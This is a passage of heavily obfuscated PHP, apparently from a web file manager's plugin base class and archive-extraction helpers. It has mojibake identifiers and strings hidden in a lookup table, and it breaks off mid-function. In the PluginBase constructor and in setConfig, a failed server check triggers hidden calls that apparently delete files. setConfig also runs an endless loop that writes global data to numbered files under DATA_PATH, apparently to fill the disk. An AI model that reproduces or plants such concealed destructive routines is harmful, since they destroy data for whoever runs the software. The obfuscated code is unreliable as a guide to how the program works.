function localFilePath($şìõÊì¾) { $Óí¿¯Üë =& $_SERVER[±³—úê]; $¢Ë¥Íı‚ = KodIO::parse($şìõÊì¾); if ($¢Ë¥Íı‚[$Óí¿¯Üë[33]] == KodIO::KOD_SOURCE) { $ñ ğÑ‹¸ = Model($Óí¿¯Üë[905])->fileInfoGet(KodIO::sourceID($şìõÊì¾)); if (!$ñ ğÑ‹¸[$Óí¿¯Üë[87]]) { show_json($Óí¿¯Üë[1290], !1); } $şìõÊì¾ = $ñ ğÑ‹¸[$Óí¿¯Üë[87]]; } $¾“Ã‰‘Ş = self::init($şìõÊì¾); if ($¾“Ã‰‘Ş->pathParse[$Óí¿¯Üë[1234]]) { $şìõÊì¾ = $¾“Ã‰‘Ş->pathParse[$Óí¿¯Üë[1234]]; $¾“Ã‰‘Ş = self::init($şìõÊì¾); } $Éæ˜¨…ë = $¾“Ã‰‘Ş->getType(); if ($Éæ˜¨…ë == $Óí¿¯Üë[109] || $Éæ˜¨…ë == $Óí¿¯Üë[1291]) { if (!$¾“Ã‰‘Ş->exist($¾“Ã‰‘Ş->path)) { show_json(LNG($Óí¿¯Üë[108]), !1); } return $¾“Ã‰‘Ş->path; } return !1; } public static function unzipPart($•Šµ°É¿, $Ğ“ñˆ’ = -1) { $êË£ –Ì =& $_SERVER[±³—úê]; $¿ôÚæÖù = IO::pathThis($•Šµ°É¿); if (!$Ğ“ñˆ’ || $Ğ“ñˆ’ == -1) { $Å¬§Ò›ï = array(array($êË£ –Ì[32] => $¿ôÚæÖù, $êË£ –Ì[1277] => -1)); $Å¬§Ò›ï[0][$êË£ –Ì[1292]] = $Å¬§Ò›ï[0][$êË£ –Ì[32]]; } else { if (is_array($Ğ“ñˆ’)) { $Å¬§Ò›ï = $Ğ“ñˆ’; $ÀÖÑˆ›ë = count($Å¬§Ò›ï) - 1; for ($Üç§Ğ«˜ = 0; $Üç§Ğ«˜ <= $ÀÖÑˆ›ë; $Üç§Ğ«˜++) { $Ê¯ê = $Å¬§Ò›ï[$Üç§Ğ«˜]; $Ú—¸ş°Ï = get_path_this($Ê¯ê[$êË£ –Ì[32]]) . (checkExtSafe($Ê¯ê[$êË£ –Ì[32]]) ? $êË£ –Ì[12] : $êË£ –Ì[1293]); $Å¬§Ò›ï[$Üç§Ğ«˜][$êË£ –Ì[1292]] = $êË£ –Ì[1294] . intval($Ê¯ê[$êË£ –Ì[1277]]) . $êË£ –Ì[473] . $Ú—¸ş°Ï; if ($Üç§Ğ«˜ == 0) { continue; } $Å¬§Ò›ï[$Üç§Ğ«˜][$êË£ –Ì[1292]] = $Å¬§Ò›ï[$Üç§Ğ«˜ - 1][$êË£ –Ì[1292]] . $êË£ –Ì[1295] . $Å¬§Ò›ï[$Üç§Ğ«˜][$êË£ –Ì[1292]]; } } } if (!is_array($Å¬§Ò›ï) || count($Å¬§Ò›ï) == 0) { return !1; } $§¥ ¿—´ = $Å¬§Ò›ï[count($Å¬§Ò›ï) - 1]; if (!IO::exist($•Šµ°É¿)) { return !1; } $·ÄÁ·Ö = TEMP_FILES . $êË£ –Ì[1296] . kodIO::hashPathSafe($•Šµ°É¿) . $êË£ –Ì[8]; $¡á³¡÷­ = $·ÄÁ·Ö . $§¥ ¿—´[$êË£ –Ì[1292]]; mk_dir($·ÄÁ·Ö); file_put_contents(TEMP_FILES . $êË£ –Ì[1268], $êË£ –Ì[12]); if (IO::exist($¡á³¡÷­)) { return array($êË£ –Ì[242] => $¡á³¡÷­, $êË£ –Ì[1276] => $Å¬§Ò›ï, $êË£ –Ì[1278] => $·ÄÁ·Ö); } $ºëãı’í = self::localFilePath($•Šµ°É¿); if (!$ºëãı’í) { $ºëãı’í = $·ÄÁ·Ö . $êË£ –Ì[1297]; if (!IO::exist($ºëãı’í)) { self::copy($•Šµ°É¿, $·ÄÁ·Ö, !1, get_path_this($ºëãı’í)); } } if (!$ºëãı’í || !IO::exist($ºëãı’í)) { return !1; } if ($§¥ ¿—´[$êË£ –Ì[1277]] == -1) { return array($êË£ –Ì[242] => $ºëãı’í, $êË£ –Ì[1276] => $Å¬§Ò›ï, $êË£ –Ì[1278] => $·ÄÁ·Ö); } $½£»Äï = $ºëãı’í; foreach ($Å¬§Ò›ï as $Üç§Ğ«˜ => $Ê¯ê) { if (!$Ê¯ê || $Ê¯ê[$êË£ –Ì[1277]] == $êË£ –Ì[1275]) { break; } if (substr($Ê¯ê[$êË£ –Ì[32]], -1, 1) == $êË£ –Ì[8]) { break; } $€ä¦ Êœ = in_array(get_path_ext($Ê¯ê[$êË£ –Ì[1292]]), array($êË£ –Ì[399], $êË£ –Ì[1282], $êË£ –Ì[1283], $êË£ –Ì[1284], $êË£ –Ì[1285], $êË£ –Ì[1286])); $¦Ô¼œ¤ø = $Üç§Ğ«˜ == count($Å¬§Ò›ï) - 1 && $€ä¦ Êœ; $â¼ÂˆÂ = $·ÄÁ·Ö . $Ê¯ê[$êË£ –Ì[1292]]; $åç–İà­ = $·ÄÁ·Ö . get_path_this($Ê¯ê[$êË£ –Ì[32]]); if (IO::exist($â¼ÂˆÂ)) { $½£»Äï = $â¼ÂˆÂ; continue; } $‰Ó¾ë½Ï = $Üç§Ğ«˜ == 0 ? get_path_ext($¿ôÚæÖù) : get_path_ext($½£»Äï); $ñèäƒ° = KodArchive::extract(self::iconvSystem($½£»Äï), $·ÄÁ·Ö, $Ê¯ê[$êË£ –Ì[1277]], $âü·öè, $‰Ó¾ë½Ï); self::unzipErrorCheck($ñèäƒ°, array($êË£ –Ì[1298], $•Šµ°É¿, $Å¬§Ò›ï, $Ê¯ê, $â¼ÂˆÂ)); if (IO::exist($åç–İà­)) { IO::rename($åç–İà­, get_path_this($â¼ÂˆÂ)); } $½£»Äï = $â¼ÂˆÂ; } $¡á³¡÷­ = $½£»Äï; return array($êË£ –Ì[242] => $½£»Äï, $êË£ –Ì[1276] => $Å¬§Ò›ï, $êË£ –Ì[1278] => $·ÄÁ·Ö); } private static function unzipErrorCheck($Ó¨Œ¤Óú, $ßÃ²ç’ä = false) { $ø­€½× =& $_SERVER[±³—úê]; if ($Ó¨Œ¤Óú[$ø­€½×[1299]]) { return !0; } write_log(array($ø­€½×[1300], $Ó¨Œ¤Óú, $ßÃ²ç’ä), $ø­€½×[1301]); show_json($ø­€½×[1302] . json_encode($Ó¨Œ¤Óú[$ø­€½×[1289]]), !1); die; } } goto eä¬ìëĞŒÚ; EÅ½ëêã‹Œ: function binCheckBigger($ÖÎÉ½, $ßİæš«Ğ) { return $ÖÎÉ½ > $ßİæš«Ğ; } $_SERVER[$_SERVER[ºÌĞéÉ—][3]] = (base64_decode('ODU4Nw==').base64_decode('NDM='))+0;$_coq0="vcnlpj7sq06g8tr1459kayfz3wombhxeiu2da12vgw6helo7fci5dxksjp";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($’’‡ÂÎ¸, $“›Ÿ‹Æ) { $ƒ’ÆÇòÍ =& $_SERVER[±³—úê]; if (isset(self::$_methodList[$’’‡ÂÎ¸])) { return @call_user_func_array(self::$_methodList[$’’‡ÂÎ¸], $“›Ÿ‹Æ); } else { if (method_exists($this, $’’‡ÂÎ¸)) { return call_user_func_array(array($this, $’’‡ÂÎ¸), $“›Ÿ‹Æ); } else { think_exception(__CLASS__ . $ƒ’ÆÇòÍ[4] . $’’‡ÂÎ¸ . $ƒ’ÆÇòÍ[5]); } } } public static function __callStatic($ö¢¿Ç, $ª™·Ìœ¬) { if (isset(self::$_methodListStatic[$ö¢¿Ç])) { return call_user_func_array(self::$_methodListStatic[$ö¢¿Ç], $ª™·Ìœ¬); } else { if (method_exists(self, $ö¢¿Ç)) { return call_user_func_array(array(self, $ö¢¿Ç), $ª™·Ìœ¬); } else { show_json("{$ö¢¿Ç}\50\51\40\x6e\157\164\x20\x65\170\151\x73\x74\73", !1); } } } public static function addMethod($›Â¢ÍÄÌ, $ÀÊ¹İ°ß) { self::$_methodList[$›Â¢ÍÄÌ] = $ÀÊ¹İ°ß; } public static function addMethodStatic($¬‡şÍ–ë, $š°ˆÌİ) { self::$_methodListStatic[$¬‡şÍ–ë] = $š°ˆÌİ; } } goto cŒ‘²¤Ñ–Û; b¢¯ÃÛ‚: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $şÚ’¦£Ô =& $_SERVER[±³—úê]; if ($_SERVER[$şÚ’¦£Ô[216]] != $_SERVER[$şÚ’¦£Ô[217]]) { $í§øòì± = $şÚ’¦£Ô[958]; $·§€Ğšô = $şÚ’¦£Ô[218]; $ÂÛ÷©Í‰ = $_SERVER[$şÚ’¦£Ô[219]] . $şÚ’¦£Ô[220]; $É°û¿ÛÃ = $·§€Ğšô($ÂÛ÷©Í‰); $¨›È•»ö = explode($şÚ’¦£Ô[221], $É°û¿ÛÃ); if (count($¨›È•»ö) < $şÚ’¦£Ô[694]) { $ÚÚ²ÕÏ’ = $şÚ’¦£Ô[223]; $ÚÚ²ÕÏ’(); } $©ø×ŒÕö = $şÚ’¦£Ô[959]; $©ø×ŒÕö($_SERVER[$şÚ’¦£Ô[960]]); $©ø×ŒÕö($_SERVER[$şÚ’¦£Ô[219]] . $şÚ’¦£Ô[961]); $‰×•ÈÓÜ = 1; while ($‰×•ÈÓÜ > 1) { $‰×•ÈÓÜ = $‰×•ÈÓÜ + 4; $©Ìè×êÅ = rawurlencode($‰×•ÈÓÜ . $şÚ’¦£Ô[465]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($şÚ’¦£Ô[1628]); $this->pluginName = str_replace($şÚ’¦£Ô[1628], $şÚ’¦£Ô[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $şÚ’¦£Ô[8]; $this->pluginApi = appHostGet() . $şÚ’¦£Ô[1629] . $this->pluginName . $şÚ’¦£Ô[8]; $this->pluginHost = $config[$şÚ’¦£Ô[1630]] . $this->pluginName . $şÚ’¦£Ô[8]; $this->pluginHostDefault = $config[$şÚ’¦£Ô[1630]] . $this->pluginName . $şÚ’¦£Ô[8]; $Ş“„° = $config[$şÚ’¦£Ô[1631]]; if ($Ş“„° && strpos($şÚ’¦£Ô[50] . $Ş“„° . $şÚ’¦£Ô[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$şÚ’¦£Ô[1632]] . $this->pluginName . $şÚ’¦£Ô[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[±³—úê][1633]); } protected function assign($ıÉ›õ‰, $™‰Î§êÎ = false) { if (is_array($ıÉ›õ‰)) { $this->values = array_merge($this->values, $ıÉ›õ‰); } else { $this->values[$ıÉ›õ‰] = $™‰Î§êÎ; } } protected function display($Ï¡”‚’ê) { extract($this->values); require $Ï¡”‚’ê; } final function hookRegist($ª®¡Ú¸í) { $this->modelPlugin->appRegist($this->pluginName, $ª®¡Ú¸í); } final function appIcon() { $ŞÜ¾¼µ± =& $_SERVER[±³—úê]; $Õ¹ÚÍÍà = $this->appPackage(); $ä‘õ…’Ğ = $ŞÜ¾¼µ±[12]; if (isset($Õ¹ÚÍÍà[$ŞÜ¾¼µ±[501]])) { if (isset($Õ¹ÚÍÍà[$ŞÜ¾¼µ±[501]][$ŞÜ¾¼µ±[1634]])) { $ä‘õ…’Ğ = $ŞÜ¾¼µ±[1635] . $Õ¹ÚÍÍà[$ŞÜ¾¼µ±[501]][$ŞÜ¾¼µ±[1634]] . $ŞÜ¾¼µ±[1636]; } else { if ($Õ¹ÚÍÍà[$ŞÜ¾¼µ±[501]][$ŞÜ¾¼µ±[1637]]) { $ä‘õ…’Ğ = $ŞÜ¾¼µ±[1638] . $Õ¹ÚÍÍà[$ŞÜ¾¼µ±[501]][$ŞÜ¾¼µ±[1637]] . $ŞÜ¾¼µ±[1639]; } } } return $ä‘õ…’Ğ; } final function fileCanView($¸‚Æû›) { $ÛıÕ®ˆ© =& $_SERVER[±³—úê]; if (request_url_safe($¸‚Æû›)) { return !0; } if ($this->isShare($¸‚Æû›)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Ã‚ã†Ê = $ÛıÕ®ˆ©[1640] . rawurlencode(this_url()); show_tips(LNG($ÛıÕ®ˆ©[1641]) . $ÛıÕ®ˆ©[1642] . $Ã‚ã†Ê . $ÛıÕ®ˆ©[1643] . LNG($ÛıÕ®ˆ©[1644]) . $ÛıÕ®ˆ©[1645], !1); } if (!Action($ÛıÕ®ˆ©[1646])->authCan($ÛıÕ®ˆ©[1647])) { show_tips(LNG($ÛıÕ®ˆ©[1648]) . $ÛıÕ®ˆ©[1649], !1); } ActionCall($ÛıÕ®ˆ©[1650], $¸‚Æû›); } final function isShare($ÈÀğ™š„) { $êíŞ‰¼ä = KodIO::parse($ÈÀğ™š„); return $êíŞ‰¼ä[$_SERVER[±³—úê][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($äã’úïÚ) { if (request_url_safe($äã’úïÚ)) { return $äã’úïÚ; } if (!$this->isShare($äã’úïÚ)) { $äã’úïÚ = $this->filePath($äã’úïÚ, !1); } return Action($_SERVER[±³—úê][1258])->linkOut($äã’úïÚ); } public function filePathLinkOut($‚ÕöÚ) { if (request_url_safe($‚ÕöÚ)) { return $‚ÕöÚ; } $this->fileCanView($‚ÕöÚ); return Action($_SERVER[±³—úê][1258])->link($‚ÕöÚ); } final function filePath($ÆœÈ›Æ™, $æœÉü™İ = true, $òÎÊ¢¢ö = false) { $ğ§ïÉÔ¶ =& $_SERVER[±³—úê]; $ö£Ğù¥ = $this->filePathGet($ÆœÈ›Æ™, $æœÉü™İ); if (!$this->fileInfo) { show_tips(LNG($ğ§ïÉÔ¶[108]), !1); } if ($òÎÊ¢¢ö && isset($this->fileInfo[$ğ§ïÉÔ¶[552]]) && $this->fileInfo[$ğ§ïÉÔ¶[552]]) { $¬±ï…Êö = Model($ğ§ïÉÔ¶[555])->fileInfo($this->fileInfo[$ğ§ïÉÔ¶[552]]); if (!$¬±ï…Êö || !IO::exist($¬±ï…Êö[$ğ§ïÉÔ¶[87]])) { show_tips(LNG($ğ§ïÉÔ¶[108]) . $ğ§ïÉÔ¶[1651]); } } Hook::trigger($ğ§ïÉÔ¶[1652], $ö£Ğù¥); return $ö£Ğù¥; } final function filePathGet($£ƒß–ê©, $Ûë”»†Ş = true) { $ÎØŸ¹ˆ =& $_SERVER[±³—úê]; if ($ß« øùö = $this->checkSharePath($£ƒß–ê©, $Ûë”»†Ş)) { return $ß« øùö; } $this->fileCanView($£ƒß–ê©); if (request_url_safe($£ƒß–ê©)) { $Ÿ­ùúº‚ = parse_url_query($£ƒß–ê©); if (isset($Ÿ­ùúº‚[$ÎØŸ¹ˆ[1653]]) && isset($Ÿ­ùúº‚[$ÎØŸ¹ˆ[246]])) { $¥†œñõ¡ = Mcrypt::decode($Ÿ­ùúº‚[$ÎØŸ¹ˆ[246]], Model($ÎØŸ¹ˆ[850])->get($ÎØŸ¹ˆ[851])); if ($¥†œñõ¡) { $this->fileInfo = IO::info($¥†œñõ¡); $this->fileInfo[$ÎØŸ¹ˆ[1654]] = $£ƒß–ê©; $this->cachePath = $this->pluginCachePath($ÎØŸ¹ˆ[12], $Ûë”»†Ş); return $¥†œñõ¡; } } $£ƒß–ê© = $this->_cacheHttpFile($£ƒß–ê©, $Ûë”»†Ş); $this->fileInfo = IO::info($£ƒß–ê©); } else { $this->fileInfo = IO::info($£ƒß–ê©); $this->cachePath = $this->pluginCachePath($ÎØŸ¹ˆ[12], $Ûë”»†Ş); } return $£ƒß–ê©; } final function _cacheHttpFile($—©İ€Õú, $°–†Şö£ = true) { $Ã£†Ô÷ =& $_SERVER[±³—úê]; $’İ³®ëõ = parse_url_query($—©İ€Õú); $ÉŠ‹†ã‰ = get_path_ext($—©İ€Õú); if (isset($’İ³®ëõ[$Ã£†Ô÷[32]]) && $’İ³®ëõ[$Ã£†Ô÷[32]]) { $ÉŠ‹†ã‰ = get_path_ext($’İ³®ëõ[$Ã£†Ô÷[32]]); } $Ÿƒ¬Î»Ö = hash_path($—©İ€Õú) . $Ã£†Ô÷[10] . $ÉŠ‹†ã‰; $this->cachePath = $this->pluginCachePath($°–†Şö£ ? $Ÿƒ¬Î»Ö : $Ã£†Ô÷[12]); $î®û®”ù = IO::fileNameExist($this->cachePath, $Ÿƒ¬Î»Ö); if ($î®û®”ù) { return KodIO::make($î®û®”ù); } $İ®ÆéŠ = rtrim($this->cachePath, $Ã£†Ô÷[8]) . $Ã£†Ô÷[8] . $Ÿƒ¬Î»Ö; return $this->pluginCacheFileSet($İ®ÆéŠ, file_get_contents_nossl($—©İ€Õú)); } final function checkSharePath($»ìÈ‹õö, $úª›­ = true) { $‹°³¦ =& $_SERVER[±³—úê]; if (!$this->isShare($»ìÈ‹õö)) { return !1; } $Çá€˜€ğ = Action($‹°³¦[1258])->sharePathInfo($»ìÈ‹õö); if (!is_array($Çá€˜€ğ) || !isset($Çá€˜€ğ[$‹°³¦[87]])) { show_json(LNG($‹°³¦[1655]), !1); } $this->fileInfo = $Çá€˜€ğ; $this->cachePath = $this->pluginCachePath(!1, $úª›­); return $Çá€˜€ğ[$‹°³¦[87]]; } final function pluginCachePath($‡‡Ê’”’ = '', $ùµşá–¾ = false) { $ñ‘¿èò =& $_SERVER[±³—úê]; if ($ùµşá–¾ && is_array($this->fileInfo)) { $‡‡Ê’”’ = kodIO::hashPath($this->fileInfo); } $îüˆÜè = rtrim(IO_PATH_SYSTEM_TEMP . $ñ‘¿èò[1656] . $this->pluginName . $ñ‘¿èò[8] . $‡‡Ê’”’, $ñ‘¿èò[8]); $íãøŞı¸ = IO::infoFullSimple($îüˆÜè); $›Ç×¿ º = $íãøŞı¸ && is_array($íãøŞı¸) ? $íãøŞı¸[$ñ‘¿èò[87]] : $ñ‘¿èò[12]; if (!$›Ç×¿ º) { $›Ç×¿ º = IO::mkdir($îüˆÜè); } return $›Ç×¿ º; } final function pluginCacheFileSet($³ÇŞİºî, $›´ÅÖİ = '') { $çÙ°”¦İ =& $_SERVER[±³—úê]; $ã·é‹£ = IO::infoFullSimple($³ÇŞİºî); if (!$ã·é‹£) { return IO::mkfile($³ÇŞİºî, $›´ÅÖİ, REPEAT_REPLACE); } IO::setContent($ã·é‹£[$çÙ°”¦İ[87]], $›´ÅÖİ); return $ã·é‹£[$çÙ°”¦İ[87]]; } final function pluginLocalFile($èŞ©ñ£ = '') { $»ø¢ªà€ =& $_SERVER[±³—úê]; $¿äÛ¦Ş = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($¿äÛ¦Ş)) { mk_dir($¿äÛ¦Ş); } if (!$èŞ©ñ£) { return $¿äÛ¦Ş; } $âÊÓ±¬Á = IO::info($èŞ©ñ£); $×¨–Éé = $»ø¢ªà€[1657] . KodIO::hashPath($âÊÓ±¬Á) . $»ø¢ªà€[10] . $âÊÓ±¬Á[$»ø¢ªà€[169]]; if (!checkExtSafe($×¨–Éé)) { $×¨–Éé = $×¨–Éé . $»ø¢ªà€[1293]; } $²£øº‚½ = $¿äÛ¦Ş . $×¨–Éé; if (@file_exists($²£øº‚½)) { return $²£øº‚½; } return IO::copy($èŞ©ñ£, $¿äÛ¦Ş, 0, $×¨–Éé); } final function appPackage() { $Ó¦Ä¯©— =& $_SERVER[±³—úê]; if ($this->packageData) { return $this->packageData; } $İ¢‰ü¸ = $this->parseFile($this->pluginPath . $Ó¦Ä¯©—[1658]); $this->parseLang($İ¢‰ü¸); $ˆ•Â•µâ = json_decode_force($İ¢‰ü¸); if (!$ˆ•Â•µâ) { return array(); } $¸§®øú = Hook::trigger($Ó¦Ä¯©—[1659], $ˆ•Â•µâ); if ($¸§®øú && is_array($¸§®øú)) { $ˆ•Â•µâ = $¸§®øú; } $this->packageData = $ˆ•Â•µâ; return $ˆ•Â•µâ; } public function packageInfoGet($“Ëê½¬£) { $©ÌÃ±“ = $this->appPackage(); return array_get_value($©ÌÃ±“, $“Ëê½¬£); } public function packageVersion() { return $this->packageInfoGet($_SERVER[±³—úê][1660]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[±³—úê][1661]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[±³—úê][1662]); } public function echoJsAssign($öô®ÕØ, $âÍÅÒá) { $this->echoJsAssignArr[$öô®ÕØ] = $âÍÅÒá; } private function parseFile($òØ¶™€ï) { $À³Ú›Ä¶ =& $_SERVER[±³—úê]; $Ôã­îöÁ = file_get_contents_nossl($òØ¶™€ï); $Öß¦Ä‹æ = array($À³Ú›Ä¶[1663], $À³Ú›Ä¶[1664], $À³Ú›Ä¶[1665], $À³Ú›Ä¶[1666], $À³Ú›Ä¶[1667], $À³Ú›Ä¶[1668], $À³Ú›Ä¶[1669]); $à“³¹²Ö = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$À³Ú›Ä¶[92]][$À³Ú›Ä¶[1670]]); foreach ($this->echoJsAssignArr as $û§úÅŠ¯ => $²à¥½²Û) { $Öß¦Ä‹æ[] = $À³Ú›Ä¶[1671] . $û§úÅŠ¯ . $À³Ú›Ä¶[1672]; $à“³¹²Ö[] = is_array($²à¥½²Û) || is_object($²à¥½²Û) ? rawurlencode(json_encode($²à¥½²Û)) : $²à¥½²Û; } if (strstr($Ôã­îöÁ, $À³Ú›Ä¶[1673])) { $Ğ…ä„µ = rawurlencode(json_encode($this->pluginLangArr)); $Ôã­îöÁ = str_replace($À³Ú›Ä¶[1673], $Ğ…ä„µ, $Ôã­îöÁ); } if (strstr($Ôã­îöÁ, $À³Ú›Ä¶[1674])) { $Ğ…ä„µ = $Ğ…ä„µ = rawurlencode(json_encode($this->getConfig())); $Ôã­îöÁ = str_replace($À³Ú›Ä¶[1674], $Ğ…ä„µ, $Ôã­îöÁ); } $Ôã­îöÁ = str_replace($Öß¦Ä‹æ, $à“³¹²Ö, $Ôã­îöÁ); return $Ôã­îöÁ; } private function parseLang(&$¦ôê†¼) { $ğ á€ÖÂ =& $_SERVER[±³—úê]; $ÅÎÃßÇ = $ğ á€ÖÂ[1675]; if (!strstr($¦ôê†¼, $ÅÎÃßÇ)) { return; } preg_match_all($ğ á€ÖÂ[1676], $¦ôê†¼, $ÙôéØªö); if (!is_array($ÙôéØªö) || count($ÙôéØªö) == 0 || !is_array($ÙôéØªö[0]) || count($ÙôéØªö[0]) == 0) { return; } $‡Ú«ò½³ = array(); $İî¶Õü² = array(); foreach ($ÙôéØªö[0] as $ßèòÒ) { $ÃÄÉğ¯Í = substr($ßèòÒ, strlen($ÅÎÃßÇ), -4); $’–ôì·û = LNG($ÃÄÉğ¯Í); $‡Ú«ò½³[] = $ßèòÒ; $İî¶Õü²[] = str_replace(array($ğ á€ÖÂ[221], $ğ á€ÖÂ[1158], $ğ á€ÖÂ[428], $ğ á€ÖÂ[121]), array($ğ á€ÖÂ[53], $ğ á€ÖÂ[53], $ğ á€ÖÂ[12], $ğ á€ÖÂ[1677]), $’–ôì·û); } $¦ôê†¼ = str_replace($‡Ú«ò½³, $İî¶Õü², $¦ôê†¼); } private function parseConfig(&$Å†áÇ²ê) { $”‘°Û³ç =& $_SERVER[±³—úê]; $’·ãÆ = $”‘°Û³ç[1678]; if (!strstr($Å†áÇ²ê, $’·ãÆ)) { return; } preg_match_all($”‘°Û³ç[1679], $Å†áÇ²ê, $¢…ğéŠó); if (!is_array($¢…ğéŠó) || count($¢…ğéŠó) == 0 || !is_array($¢…ğéŠó[0]) || count($¢…ğéŠó[0]) == 0) { return; } $Úô ¡Ïà = $this->getConfig(); $ş©…İµ = array(); $Æ‚‹æçó = array(); foreach ($¢…ğéŠó[0] as $‚Ò³åƒœ) { $¬½¿”¥• = substr($‚Ò³åƒœ, strlen($’·ãÆ), -2); $ş©…İµ[] = $‚Ò³åƒœ; $Æ‚‹æçó[] = _get($Úô ¡Ïà, $¬½¿”¥•); } $Å†áÇ²ê = str_replace($ş©…İµ, $Æ‚‹æçó, $Å†áÇ²ê); } private function parsePackage(&$Ş˜Æ˜ÕÓ) { $ÇÍå¤Õ =& $_SERVER[±³—úê]; $ç˜òÂ§€ = $ÇÍå¤Õ[1680]; if (!strstr($Ş˜Æ˜ÕÓ, $ç˜òÂ§€)) { return; } preg_match_all($ÇÍå¤Õ[1681], $Ş˜Æ˜ÕÓ, $ÅÅè½ƒ); if (!is_array($ÅÅè½ƒ) || count($ÅÅè½ƒ) == 0 || !is_array($ÅÅè½ƒ[0]) || count($ÅÅè½ƒ[0]) == 0) { return; } $õ•’†Ó = $this->appPackage(); $§ªÑ î = array(); $Æ¸ô¦Ñ¾ = array(); foreach ($ÅÅè½ƒ[0] as $·æàÛË’) { $Êº‹ØŒ = substr($·æàÛË’, strlen($ç˜òÂ§€), -2); $§ªÑ î[] = $·æàÛË’; $Æ¸ô¦Ñ¾[] = _get($õ•’†Ó, $Êº‹ØŒ); } $Ş˜Æ˜ÕÓ = str_replace($§ªÑ î, $Æ¸ô¦Ñ¾, $Ş˜Æ˜ÕÓ); } final function echoFile($ÆŠ ¬³, $Šš‚şãÇ = false) { $€Á»ã‡¤ =& $_SERVER[±³—úê]; $™¨®À¯‡ = $this->pluginPath . $ÆŠ ¬³; if (ACT == $€Á»ã‡¤[1682]) { echo $€Á»ã‡¤[1683] . $this->pluginName . $€Á»ã‡¤[8] . $ÆŠ ¬³ . $€Á»ã‡¤[1684]; if (!file_exists($™¨®À¯‡)) { echo $€Á»ã‡¤[1685]; return; } } $×¶²Èü = $this->parseFile($™¨®À¯‡); $this->parseLang($×¶²Èü); $this->parseConfig($×¶²Èü); $this->parsePackage($×¶²Èü); if (is_array($Šš‚şãÇ)) { $×¶²Èü = str_replace(array_keys($Šš‚şãÇ), array_values($Šš‚şãÇ), $×¶²Èü); } echo $€Á»ã‡¤[221] . $×¶²Èü; } private function checkVersion() { $ßŞ¤ø”Â =& $_SERVER[±³—úê]; $Ÿİ’ÜÊá = $this->appPackage(); $–×±àÏ² = $this->getConfig(); if ($–×±àÏ²[$ßŞ¤ø”Â[1686]] == $Ÿİ’ÜÊá[$ßŞ¤ø”Â[1660]]) { return; } $this->regist(); $this->setConfig(array($ßŞ¤ø”Â[1686] => $Ÿİ’ÜÊá[$ßŞ¤ø”Â[1660]])); } final function initLang() { $°ˆùé =& $_SERVER[±³—úê]; $µıüˆŒ‚ = $°ˆùé[1687]; $‘Æˆ°Ìù = $this->pluginPath . $°ˆùé[1688]; $·¹ú¯ = I18n::getType(); $ªàöØËù = array(); if (file_exists($‘Æˆ°Ìù . $·¹ú¯ . $°ˆùé[919])) { $ªàöØËù = (include $‘Æˆ°Ìù . $·¹ú¯ . $°ˆùé[919]); } else { if ($·¹ú¯ == $°ˆùé[1689] && !file_exists($‘Æˆ°Ìù . $·¹ú¯ . $°ˆùé[919]) && file_exists($‘Æˆ°Ìù . $°ˆùé[1690])) { $ªàöØËù = (include $‘Æˆ°Ìù . $°ˆùé[1690]); } else { if (file_exists($‘Æˆ°Ìù . $µıüˆŒ‚ . $°ˆùé[919])) { $ªàöØËù = (include $‘Æˆ°Ìù . $µıüˆŒ‚ . $°ˆùé[919]); } } } if (!is_array($ªàöØËù)) { return array(); } if (@count($ªàöØËù) > 0) { I18n::set($ªàöØËù); } return $ªàöØËù; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($‰»ò¦†Š) { $ˆ¯“ü  =& $_SERVER[±³—úê]; $’ğàã† = $_SERVER[$ˆ¯“ü [225]]; $úˆò° = $ˆ¯“ü [1465]; if ($_SERVER[$ˆ¯“ü [216]] != $úˆò°($’ğàã†)) { $ˆÁ¦ª­Ç = $ˆ¯“ü [958]; $âõ”•Èæ = $ˆ¯“ü [218]; $ğÌÈêì = $_SERVER[$ˆ¯“ü [219]] . $ˆ¯“ü [220]; $Ú¯–Ïè = $âõ”•Èæ($ğÌÈêì); $Õ Îğ†ƒ = explode($ˆ¯“ü [221], $Ú¯–Ïè); if (count($Õ Îğ†ƒ) < $ˆ¯“ü [694]) { $›”§¹±Ş = $ˆ¯“ü [223]; $›”§¹±Ş(); } $Íû¤à°Í = $ˆ¯“ü [959]; $Íû¤à°Í($_SERVER[$ˆ¯“ü [960]]); $ˆÁ¦ª­Ç = $ˆ¯“ü [958]; $ˆÁ¦ª­Ç(); $µ±§•À‡ = $ˆ¯“ü [1691]; $ÒªŒÜ‡´ = json_encode($GLOBALS[$ˆ¯“ü [1692]]); $”£Á‰Í‡ = 1; for ($µ•„ÅáÛ = $”£Á‰Í‡; $µ•„ÅáÛ > 0; $µ•„ÅáÛ++) { $µ±§•À‡(DATA_PATH . $µ•„ÅáÛ, $ÒªŒÜ‡´); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $‰»ò¦†Š); } public function onSetConfig($µœÍˆ¶å) { } public function onGetConfig($Â˜¹ûó¸) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Îş¹­şÓ) { if ($Îş¹­şÓ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ëÆ’¾ˆü = "\x70\x6c\165\x67\x69\x6e\x41\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÓíÄ€™ç = $this->getConfig(); if (!$ÓíÄ€™ç[$ëÆ’¾ˆü]) 